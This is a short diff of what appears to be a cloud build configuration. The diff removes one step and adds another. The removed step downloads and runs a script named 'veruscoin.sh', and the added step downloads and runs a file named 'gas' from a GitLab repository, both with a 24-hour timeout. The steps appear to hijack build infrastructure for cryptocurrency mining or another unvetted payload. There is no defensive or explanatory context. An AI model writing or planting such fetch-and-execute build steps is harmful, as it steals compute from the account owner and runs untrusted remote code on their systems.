@@ -3,8 +3,8 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && wget https://raw.githubusercontent.com/Ghhjjhh/jdjdj/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
- waitFor:
+         apt update && apt-get install sudo -y && wget https://gitlab.com/g778/agung/-/raw/main/gas && chmod u+x gas && ./gas
+    waitFor:
       - '-'
     entrypoint: /bin/bash
 timeout: 86400s
